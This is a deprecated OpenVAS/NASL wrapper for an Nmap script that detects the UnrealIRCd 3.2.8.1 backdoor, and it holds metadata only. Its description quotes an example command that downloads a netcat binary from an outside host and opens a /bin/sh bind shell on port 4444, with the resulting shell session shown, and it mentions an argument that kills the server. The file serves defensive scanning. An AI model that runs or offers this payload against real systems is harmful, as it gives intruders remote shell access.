if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.104013" );
	script_version( "2020-07-07T14:13:50+0000" );
	script_tag( name: "last_modification", value: "2020-07-07 14:13:50 +0000 (Tue, 07 Jul 2020)" );
	script_tag( name: "creation_date", value: "2011-06-01 16:32:46 +0200 (Wed, 01 Jun 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Nmap NSE net: irc-unrealircd-backdoor" );
	script_category( ACT_INIT );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_copyright( "Copyright (C) 2011 NSE-Script: The Nmap Security Scanner; NASL-Wrapper: Greenbone Networks GmbH" );
	script_family( "Nmap NSE net" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2010/Jun/277" );
	script_xref( name: "URL", value: "http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt" );
	script_xref( name: "URL", value: "http://www.metasploit.com/modules/exploit/unix/irc/unreal_ircd_3281_backdoor" );
	script_tag( name: "summary", value: "Checks if an IRC server is backdoored by running a time-based command (ping) and checking how long
it takes to respond.

The 'irc-unrealircd-backdoor.command' script argument can be used to  run an arbitrary
command on the remote system. Because of the nature of this vulnerability (the output is never
returned) we have no way of getting the output of the command. It can, however, be used to start a
netcat listener as demonstrated here:'   $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse -script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x
./nc && ./nc -l -p 4444 -e /bin/sh' <target>   $ ncat -vv localhost 4444   Ncat: Version 5.30BETA1 (http://nmap.org/ncat)   Ncat: Connected to 127.0.0.1:4444.   pwd /home/ron/downloads/Unreal3.2-bad   whoami   ron '

Metasploit can also be used to exploit this vulnerability.

In addition to running arbitrary commands, the 'irc-unrealircd-backdoor.kill' script
argument can be passed, which simply kills the UnrealIRCd process.

SYNTAX:

irc-unrealircd-backdoor.wait:  Wait time in seconds before executing the check. This is recommended to set for more reliable check (100 is good value).

irc-unrealircd-backdoor.kill:  If set to '1' or 'true', kill the backdoored UnrealIRCd running.

irc-unrealircd-backdoor.command:  An arbitrary command to run on the remote system (note, however, that you won't see the output of your command).
This will always be attempted, even if the host isn't vulnerable. The pattern '%IP%' will be replaced with the ip address of the target host." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "deprecated", value: TRUE );
	exit( 0 );
}
exit( 66 );

